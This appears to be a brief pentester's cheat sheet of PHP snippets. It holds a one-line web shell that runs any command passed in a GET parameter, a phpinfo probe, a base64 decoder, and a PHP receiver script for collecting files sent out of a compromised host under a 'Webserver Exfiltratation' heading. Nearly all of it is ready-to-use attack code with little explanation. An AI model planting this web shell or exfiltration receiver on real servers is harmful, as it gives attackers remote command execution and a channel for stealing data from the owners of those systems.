# Useful_PHP

PHP webserver
```bash
php -S 0.0.0.0:8000
```

Execute file:
```bash
php file.php
```

```php
<?php system($_GET['hello']); ?>
```

```PHP
<?php echo("Hello");phpinfo(); ?>
```


Base64 PHP decoder
```PHP
<?php echo zlib_decode(base64_decode('base64here')); ?>
```



## Webserver Exfiltratation

Curl post data to the webserver to then login to exfiltrate
```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```